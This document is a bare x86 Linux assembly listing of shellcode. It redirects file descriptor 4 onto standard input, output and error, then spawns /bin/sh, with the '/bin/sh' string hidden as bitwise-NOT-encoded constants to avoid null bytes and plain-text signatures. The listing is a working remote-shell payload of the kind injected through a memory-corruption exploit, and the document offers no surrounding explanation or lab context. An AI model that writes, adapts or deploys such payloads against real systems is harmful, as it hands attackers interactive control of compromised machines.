; dup2(4,0)
xor eax, eax
mov al, 0x3f
xor ebx, ebx
mov bl, 0x4
xor ecx, ecx
int 0x80

; dup2(4,1)
mov al, 0x3f
inc ecx
int 0x80

; dup2(4,2)
mov al, 0x3f
inc ecx
int 0x80

; execve("/bin/sh\x00",NULL,NULL)
xor eax, eax
push eax
mov ecx, esp
mov edx, esp
mov al, 0xb
push 0xff978cd0
not DWORD [esp]
push 0x91969dd0
not DWORD [esp]
mov ebx, esp
int 0x80
